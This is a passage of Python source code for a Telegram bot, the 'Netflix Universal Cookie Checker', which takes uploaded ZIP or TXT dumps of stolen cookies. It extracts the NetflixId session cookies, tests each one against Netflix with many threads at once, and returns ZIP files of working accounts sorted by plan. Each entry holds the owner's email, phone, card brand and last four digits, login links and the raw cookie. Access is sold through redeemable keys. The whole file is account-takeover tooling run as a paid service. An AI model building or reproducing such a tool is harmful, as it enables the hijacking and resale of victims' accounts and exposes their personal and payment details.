        buttons.append([InlineKeyboardButton(text="⚙️ Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 Generate Key", callback_data="gen_key")],
        [InlineKeyboardButton(text="1 Day", callback_data="key_1"),
         InlineKeyboardButton(text="7 Days", callback_data="key_7")],
        [InlineKeyboardButton(text="15 Days", callback_data="key_15"),
         InlineKeyboardButton(text="30 Days", callback_data="key_30")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ])

def cookie_option_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Keep Cookies", callback_data="keep_yes")],
        [InlineKeyboardButton(text="❌ Remove Cookies", callback_data="keep_no")]
    ])

def stop_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 STOP", callback_data="stop_check")]
    ])

# ============ /CHK COMMAND HANDLER ============
@dp.message(Command("chk"))
async def cmd_chk(message: Message, state: FSMContext):
    """
    Handle /chk command when replying to a file.
    Works with zip and txt files.
    """
    # Check if this is a reply to a message with a file
    if not message.reply_to_message:
        await message.reply(
            "⚠️ <b>Please reply to a zip or txt file with /chk command.</b>\n\n"
            "Usage: Reply to a file and type /chk"
        )
        return
    
    target_message = message.reply_to_message
    
    # Check for document
    if not target_message.document:
        await message.reply("⚠️ <b>No file found in the replied message.</b>")
        return
    
    document = target_message.document
    file_name = document.file_name.lower()
    
    # Check file extension
    if not (file_name.endswith('.zip') or file_name.endswith('.txt')):
        await message.reply("⚠️ <b>Only .zip and .txt files are supported.</b>")
        return
    
    # Store file info and ask for cookie option
    await state.update_data(file=target_message, chk_command=True)
    await message.answer("🔧 <b>Keep cookies in results?</b>", reply_markup=cookie_option_menu())

# ============ HANDLERS ============
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user = await db.get_user(message.from_user.id)
    if not user:
        await db.create_user(message.from_user.id, message.from_user.username or "Unknown", message.from_user.first_name or "User")
    
    welcome = f"""
<b>🎬 Netflix Universal Cookie Checker</b>

Welcome, {message.from_user.first_name}! 

<b>Features:</b>
• Universal cookie detection (any format)
• Recursive ZIP scanning
• Hold/Pause account detection
• Mobile app login links
• Auto-extracts NetflixId from any file

<b>Commands:</b>
• /start - Main menu
• /stop - Stop & get results
• /chk - Reply to file to check
-----------------------------------------

{'👑 Admin Mode' if message.from_user.id in ADMIN_IDS else '👤 User Mode'}
    """
    await message.answer(welcome, reply_markup=main_menu(message.from_user.id))

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    user_id = message.from_user.id
    if user_id in check_storage and not check_storage[user_id].get('stopped', False):
        check_storage[user_id]['stop_event'].set()
        check_storage[user_id]['stopped'] = True
        await message.answer("🛑 <b>Stopping... Sending results...</b>")
    else:
        await message.answer("❌ <b>No active check found.</b>")

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(callback: CallbackQuery):
    await callback.message.edit_text("<b>🎬 Netflix Cookie Checker</b>", reply_markup=main_menu(callback.from_user.id))

@dp.callback_query(F.data == "upload_file")
async def cb_upload(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text(
        "📤 <b>Send me a ZIP or TXT file</b>\n\n"
        "I'll scan all files recursively and find every NetflixId cookie.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Cancel", callback_data="main_menu")]
        ])
    )

@dp.callback_query(F.data == "paste_cookie")
async def cb_paste(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(UserStates.waiting_for_cookie_input)
    await callback.message.edit_text(
        "📝 <b>Paste your cookie below:</b>\n\nSend /cancel to abort",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Cancel", callback_data="main_menu")]
        ])
    )

@dp.message(UserStates.waiting_for_cookie_input)
async def process_single(message: Message, state: FSMContext):
    await state.clear()
    
    status = await message.answer("🔍 <b>Checking...</b>")
    
    cookies = load_cookies(message.text)
    if not cookies:
        await status.edit_text("❌ Invalid format", reply_markup=main_menu(message.from_user.id))
        return
    
    result = check_account(cookies)
    
    if not result:
        await status.edit_text("❌ <b>Invalid/Expired Cookie</b>", reply_markup=main_menu(message.from_user.id))
        await db.increment_usage(message.from_user.id, 1, 0)
        return
    
    await status.delete()
    
    # Build response
    cc = result['country_code']
    flag = _flag(cc)
    
    # FIXED: Proper status detection for single account check - check hold FIRST
    if result.get('is_hold') or result.get('status') == 'hold':
        status_emoji = "⏸"
        status_text = "ON HOLD"
    else:
        status_emoji = "✅"
        status_text = "VALID"
    
    buttons = []
    if result.get('login_pc') and result['login_pc'] != "N/A":
        buttons.append([InlineKeyboardButton(text="🖥 PC LOGIN", url=result['login_pc'])])
    if result.get('login_phone') and result['login_phone'] != "N/A":
        buttons.append([InlineKeyboardButton(text="📱 PHONE LOGIN", url=result['login_phone'])])
    if result.get('mobile_app_link') and result['mobile_app_link'] != "N/A":
        buttons.append([InlineKeyboardButton(text="📲 MOBILE APP", url=result['mobile_app_link'])])
    buttons.append([InlineKeyboardButton(text="📺 TV LOGIN", url=result['login_tv'])])
    buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")])
    
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    
    profs = ", ".join(result['profiles'][:5]) if result.get('profiles') else "N/A"
    
    def escape_html(text):
        if not text:
            return "N/A"
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    
    text = f"""
{status_emoji} <b>NETFLIX ACCOUNT {status_text}</b>

<b>👤 Name:</b> {escape_html(result['name'])}
<b>📧 Email:</b> <code>{escape_html(result['email'])}</code>
<b>🌍 Country:</b> {escape_html(result['country'])} {flag} ({cc})

<b>📋 Plan:</b> {escape_html(result['plan'])}
<b>💰 Price:</b> {escape_html(result['price'])}
<b>🎥 Quality:</b> {escape_html(result['video_quality'])}
<b>📺 Streams:</b> {escape_html(result['max_streams'])}

<b>📅 Member Since:</b> {escape_html(result['member_since'])}
<b>🗓 Next Billing:</b> {escape_html(result['next_billing'])}
<b>⏸ Status:</b> {status_text}

<b>💳 Payment:</b> {escape_html(result['card_brand'])} *{escape_html(result['card_last4'])}
<b>📞 Phone:</b> {escape_html(result['phone'])} {'✅' if result.get('phone_verified') else '❌'}

<b>👥 Profiles ({result['profile_count']}):</b> {escape_html(profs)}

<b>🔗 LOGIN LINKS:</b>
💻 PC: <code>{escape_html(result['login_pc'])}</code>
📱 Phone: <code>{escape_html(result['login_phone'])}</code>
📲 Mobile App: <code>{escape_html(result.get('mobile_app_link', 'N/A'))}</code>
📺 TV: <code>{escape_html(result['login_tv'])}</code>

<b>🍪 FULL COOKIE:</b>
<code>{escape_html(result.get('netflix_id_raw', 'N/A'))}</code>
    """
    
    await message.answer(text, reply_markup=kb)
    await db.increment_usage(message.from_user.id, 1, 1)

@dp.message(F.document)
async def handle_doc(message: Message, state: FSMContext):
    if not message.document.file_name.lower().endswith(('.zip', '.txt')):
        await message.answer("❌ Send ZIP or TXT only")
        return
    
    await state.update_data(file=message)
    await message.answer("🔧 Keep cookies in results?", reply_markup=cookie_option_menu())

@dp.callback_query(F.data.startswith("keep_"))
async def process_file(callback: CallbackQuery, state: FSMContext):
    keep = callback.data == "keep_yes"
    data = await state.get_data()
    message = data['file']
    await state.clear()
    await callback.message.delete()
    
    user_id = callback.from_user.id
    filename = message.document.file_name
    
    stop_event = threading.Event()
    check_storage[user_id] = {
        'stop_event': stop_event,
        'stopped': False,
        'cookies': [],
        'results': {
            'premium': [],
            'standard': [],
            'standard_ads': [],
            'mobile': [],
            'basic': [],
            'hold': [],
            'other': [],
            'invalid': 0,
            'expired': 0,
            'rate_limit': 0,
            'other_fail': 0
        },
        'checked': 0,
        'hits': 0,
        'keep': keep,
        'start_time': time.time()
    }
    
    status = await message.answer("📥 Downloading...")
    
    try:
        file = await bot.get_file(message.document.file_id)
        file_path = file.file_path
        file_data = BytesIO()
        await bot.download_file(file.file_path, destination=file_data)
        file_data.seek(0)
        
        await safe_edit(status, "🔍 Extracting cookies from all files...")
        
        extractor = CookieExtractor()
        if filename.lower().endswith('.zip'):
            all_cookies = extractor.extract_from_zip(file_data.read())
        else:
            content = file_data.read().decode('utf-8', errors='ignore')
            all_cookies = extractor.extract_from_text(content, filename)
        
        if not all_cookies:
            await safe_edit(status, "❌ No NetflixId cookies found", reply_markup=main_menu(user_id))
            del check_storage[user_id]
            return
        
        total = len(all_cookies)
        
        can_check, limit, remaining = await db.can_check(user_id, total)
        if not can_check and limit != -1:
            all_cookies = all_cookies[:remaining]
            total = len(all_cookies)
            await message.answer(f"⚠️ Limit reached. Checking first {total}")
        
        check_storage[user_id]['cookies'] = all_cookies
        check_storage[user_id]['total'] = total
        
        await safe_edit(status, f"🚀 Found {total} cookies. Checking...\nUse /stop to get results", reply_markup=stop_button())
        
        def check_one(cookie_data):
            if stop_event.is_set():
                return None, None
            try:
                cookies = load_cookies(cookie_data['cookie'])
                result = check_account(cookies)
                if result:
                    result['source'] = cookie_data['source']
                    result['cookie_raw'] = cookie_data['raw'] if keep else ""
                    return result, None
            except Exception as e:
                print(f"Check error: {e}")
                return None, str(e)
            return None, None
        
        batch_size = CONCURRENT_CHECKS
        for i in range(0, len(all_cookies), batch_size):
            if stop_event.is_set():
                break
            
            batch = all_cookies[i:i+batch_size]
            
            with ThreadPoolExecutor(max_workers=batch_size) as executor:
                futures = [executor.submit(check_one, c) for c in batch]
                for future in as_completed(futures):
                    res, err = future.result()
                    check_storage[user_id]['checked'] += 1
                    
                    if res:
                        check_storage[user_id]['hits'] += 1
                        
                        # FIXED: Check hold status FIRST before plan type
                        if res.get('is_hold') or res.get('status') == 'hold':
                            check_storage[user_id]['results']['hold'].append(res)
                        else:
                            # Only categorize by plan if NOT on hold
                            plan_lower = res.get('plan', '').lower()
                            if 'premium' in plan_lower:
                                check_storage[user_id]['results']['premium'].append(res)
                            elif 'standard' in plan_lower and 'ads' in plan_lower:
                                check_storage[user_id]['results']['standard_ads'].append(res)
                            elif 'standard' in plan_lower:
                                check_storage[user_id]['results']['standard'].append(res)
                            elif 'mobile' in plan_lower:
                                check_storage[user_id]['results']['mobile'].append(res)
                            elif 'basic' in plan_lower:
                                check_storage[user_id]['results']['basic'].append(res)
                            else:
                                check_storage[user_id]['results']['other'].append(res)
                    else:
                        check_storage[user_id]['results']['invalid'] += 1
                        if err:
                            if '403' in str(err) or '401' in str(err):
                                check_storage[user_id]['results']['expired'] += 1
                            elif 'timeout' in str(err).lower() or 'rate' in str(err).lower():
                                check_storage[user_id]['results']['rate_limit'] += 1
                            else:
                                check_storage[user_id]['results']['other_fail'] += 1
            
            checked = check_storage[user_id]['checked']
            hits = check_storage[user_id]['hits']
            progress = (checked / total) * 100
            bar = "█" * int(progress / 10) + "░" * (10 - int(progress / 10))
            
            try:
                await safe_edit(
                    status,
                    f"⏳ <b>{checked}/{total}</b> <code>[{bar}]</code> {progress:.1f}%\n"
                    f"✅ Hits: {hits} | ❌ Bad: {checked - hits}\n"
                    f"<i>Use /stop to get current results</i>",
                    reply_markup=stop_button()
                )
            except:
                pass
        
        check_storage[user_id]['stopped'] = True
        await send_results(message, status, user_id)
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        await message.answer(f"❌ Error: {str(e)[:200]}")
    finally:
        if user_id in check_storage:
            del check_storage[user_id]

@dp.callback_query(F.data == "stop_check")
async def cb_stop(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in check_storage and not check_storage[user_id]['stopped']:
        check_storage[user_id]['stop_event'].set()
        check_storage[user_id]['stopped'] = True
        await callback.answer("Stopping...")
        await callback.message.edit_text("🛑 <b>Stopped! Sending results...</b>")

def categorize_account(acc: dict) -> str:
    """Determine account category for folder structure - FIXED: Check hold FIRST"""
    # Priority 1: Check hold status before anything else
    if acc.get('is_hold') or acc.get('status') == 'hold':
        return 'Non-Premium/Hold'
    
    # Priority 2: Then check plan type
    plan_lower = acc.get('plan', '').lower()
    
    if 'premium' in plan_lower:
        return 'Premium'
    
    if 'standard' in plan_lower and 'ads' in plan_lower:
        return 'Non-Premium/Standard with Ads'
    
    if 'standard' in plan_lower:
        return 'Non-Premium/Standard'
    
    if 'mobile' in plan_lower:
        return 'Non-Premium/Mobile'
    
    if 'basic' in plan_lower:
        return 'Non-Premium/Basic'
    
    return 'Non-Premium/Other'

async def send_results(message: Message, status_msg, user_id: int):
    if user_id not in check_storage:
        return
    
    data = check_storage[user_id]
    results = data['results']
    checked = data['checked']
    hits = data['hits']
    keep = data['keep']
    start_time = data['start_time']
    
    # Calculate statistics
    elapsed = time.time() - start_time
    speed = checked / elapsed if elapsed > 0 else 0
    
    premium_count = len(results['premium'])
    standard_count = len(results['standard'])
    standard_ads_count = len(results['standard_ads'])
    mobile_count = len(results['mobile'])
    basic_count = len(results['basic'])
    hold_count = len(results['hold'])
    other_count = len(results['other'])
    
    non_premium_total = standard_count + standard_ads_count + mobile_count + basic_count + hold_count + other_count
    valid_total = hits
    failed_count = checked - hits
    
    # Build completion message
    completion_msg = f"""
<b>Process Finished ✅</b>

📈 <b>Final Statistics:</b>
📁 <b>Total Accounts :</b> <code>{checked}</code>
✅ <b>Valid Accounts :</b> <code>{valid_total}</code>
💎 <b>Premium        :</b> <code>{premium_count}</code>
🆓 <b>Non-Premium    :</b> <code>{non_premium_total}</code>
   ├ <b>Standard             :</b> <code>{standard_count}</code>
   ├ <b>Standard with Ads    :</b> <code>{standard_ads_count}</code>
   ├ <b>Mobile               :</b> <code>{mobile_count}</code>
   ├ <b>Basic                :</b> <code>{basic_count}</code>
   ├ <b>Hold                 :</b> <code>{hold_count}</code>
   └ <b>Other                :</b> <code>{other_count}</code>
❌ <b>Failed Accounts:</b> <code>{failed_count}</code>
   ├ 🔴 <b>Expired (403)      :</b> <code>{results['expired']}</code>
   ├ 🟡 <b>Rate-limit/timeout :</b> <code>{results['rate_limit']}</code>
   └ ⚪ <b>Other              :</b> <code>{results['other_fail']}</code>
⏱️ <b>Time Taken     :</b> <code>{format_time(elapsed)}</code>
⚡ <b>Speed          :</b> <code>{speed:.2f} accounts/sec</code>
    """
    
    await safe_edit(status_msg, completion_msg)
    
    if hits > 0:
        try:
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Premium folder
                for acc in results['premium']:
                    try:
                        email = acc.get('email', 'unknown').replace('@', '_')
                        fname = f"Premium/[Premium] {email}.txt"
                        content = format_file(acc, keep)
                        zf.writestr(fname, content.encode('utf-8'))
                    except Exception:
                        pass
                
                # Non-Premium subfolders - FIXED: Hold accounts go to Hold folder
                folder_mapping = {
                    'standard': ('Non-Premium/Standard', 'Standard'),
                    'standard_ads': ('Non-Premium/Standard with Ads', 'Standard_Ads'),
                    'mobile': ('Non-Premium/Mobile', 'Mobile'),
                    'basic': ('Non-Premium/Basic', 'Basic'),
                    'hold': ('Non-Premium/Hold', 'Hold'),
                    'other': ('Non-Premium/Other', 'Other')
                }
                
                for key, (folder, tag) in folder_mapping.items():
                    for acc in results[key]:
                        try:
                            email = acc.get('email', 'unknown').replace('@', '_')
                            # FIXED: Use [HOLD] tag for hold accounts
                            status_tag = "[HOLD]" if acc.get('is_hold') or acc.get('status') == 'hold' else ""
                            fname = f"{folder}/{status_tag}[{tag}] {email}.txt"
                            content = format_file(acc, keep)
                            zf.writestr(fname, content.encode('utf-8'))
                        except Exception:
                            pass
            
            zip_buffer.seek(0)
            await message.answer_document(
                BufferedInputFile(zip_buffer.getvalue(), f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"),
                caption=f"📁 Netflix Cookie Checker Results\n({'with cookies' if keep else 'info only'})",
                reply_markup=main_menu(user_id)
            )
        except Exception as e:
            await message.answer(f"❌ ZIP Error: {str(e)[:200]}")
    else:
        await message.answer("😔 No valid accounts found", reply_markup=main_menu(user_id))

def format_time(seconds):
    """Format elapsed time"""
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        minutes = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{minutes}m {secs}s"
    else:
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        return f"{hours}h {minutes}m"

def format_file(acc: dict, include_cookie: bool) -> str:
    """Format account file with mobile app link - FIXED: Proper hold status"""
    # FIXED: Check hold status FIRST
    if acc.get('is_hold') or acc.get('status') == 'hold':
        status = "ON HOLD"
    else:
        status = "VALID"
    
    lines = []
    lines.append("=" * 70)
    lines.append(f"              NETFLIX ACCOUNT - {status}")
    lines.append("=" * 70)
    lines.append("")
    lines.append(f"👤  Name:           {acc.get('name', 'N/A')}")
    lines.append(f"📧  Email:          {acc.get('email', 'N/A')}")
    lines.append(f"🌍  Country:        {acc.get('country', 'Unknown')} ({acc.get('country_code', 'XX')})")
    lines.append(f"⏸   Status:         {status}")
    lines.append("")
    lines.append(f"📋  Plan:           {acc.get('plan', 'N/A')}")
    lines.append(f"💰  Price:          {acc.get('price', 'N/A')}")
    lines.append(f"📅  Member Since:   {acc.get('member_since', 'N/A')}")
    lines.append(f"📅  Next Billing:   {acc.get('next_billing', 'N/A')}")
    lines.append("")
    lines.append(f"🎥  Quality:        {acc.get('video_quality', 'N/A')}")
    lines.append(f"📺  Max Streams:    {acc.get('max_streams', 'N/A')}")
    lines.append(f"➕  Extra Slots:    {acc.get('extra_slots', 0)}")
    lines.append("")
    lines.append(f"💳  Card Brand:     {acc.get('card_brand', 'N/A')}")
    lines.append(f"🔢  Card Last 4:    {acc.get('card_last4', 'N/A')}")
    lines.append(f"💳  Pay Method:     {acc.get('payment_method', 'N/A')}")
    lines.append(f"📞  Phone:          {acc.get('phone', 'N/A')}")
    lines.append(f"✅  Phone Verified: {'Yes' if acc.get('phone_verified') else 'No'}")
    lines.append("")
    profs = ", ".join(acc.get('profiles', [])) if acc.get('profiles') else "N/A"
    lines.append(f"👥  Profiles ({acc.get('profile_count', 0)}):  {profs}")
    lines.append(f"🆔  User GUID:      {acc.get('user_guid', 'N/A')}")
    lines.append("")
    lines.append("-" * 70)
    lines.append("🔗  LOGIN LINKS (WITH NFTOKEN)")
    lines.append("-" * 70)
    lines.append(f"💻  PC:             {acc.get('login_pc', 'N/A')}")
    lines.append(f"📱  Phone:          {acc.get('login_phone', 'N/A')}")
    lines.append(f"📲  Mobile App:     {acc.get('mobile_app_link', 'N/A')}")
    lines.append(f"📺  TV:             {acc.get('login_tv', 'N/A')}")
    
    if include_cookie and acc.get('cookie_raw'):
        lines.append("")
        lines.append("-" * 70)
        lines.append("🍪  RAW COOKIE")
        lines.append("-" * 70)
        lines.append(acc['cookie_raw'])
    
    lines.append("")
    lines.append("=" * 70)
    lines.append("by Netflix Universal Cookie Checker Bot")
    lines.append("=" * 70)
    
    return "\n".join(lines)

# ============ KEY SYSTEM ============
@dp.callback_query(F.data == "redeem_key")
async def cb_redeem(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(UserStates.waiting_for_key_redemption)
    await callback.message.edit_text("""DM @Guku896 TO GET KEY 
🔑 Enter key:""", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Cancel", callback_data="main_menu")]
    ]))

@dp.message(UserStates.waiting_for_key_redemption)
async def process_key(message: Message, state: FSMContext):
    await state.clear()
    days = await db.redeem_key(message.text, message.from_user.id)
    if days:
        await message.answer(f"✅ Key redeemed! {days} days unlimited access.", reply_markup=main_menu(message.from_user.id))
    else:
        await message.answer("""❌ Invalid/used key 
 DM @Guku896 TO GET KEY""", reply_markup=main_menu(message.from_user.id))

@dp.callback_query(F.data == "admin_panel")
async def cb_admin(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("No", show_alert=True)
        return
    await callback.message.edit_text("⚙️ Admin", reply_markup=admin_menu())

@dp.callback_query(F.data.startswith("key_"))
async def cb_genkey(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    days = int(callback.data.split("_")[1])
    key = await db.create_key(days, callback.from_user.id)
    await callback.message.edit_text(f"✅ Key: <code>{key}</code>\n{days} days", reply_markup=admin_menu())

@dp.callback_query(F.data == "my_stats")
async def cb_stats(callback: CallbackQuery):
    user = await db.get_user(callback.from_user.id)
    text = f"""
<b>📊 Stats</b>
Checked: {user['total_checked']}
Hits: {user['total_hits']}
Daily: {user['daily_used']}/{FREE_DAILY_LIMIT}
"""
    if user.get('unlimited_until'):
        text += f"\nUnlimited until: {user['unlimited_until'][:10]}"
    await callback.message.edit_text(text, reply_markup=main_menu(callback.from_user.id))

async def safe_edit(msg, text, **kwargs):
    try:
        return await msg.edit_text(text, **kwargs)
    except:
        return msg

# ============ MAIN ============
async def main():
    await db.init()
    print("🚀 Netflix Universal Cookie Checker Bot Started!")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())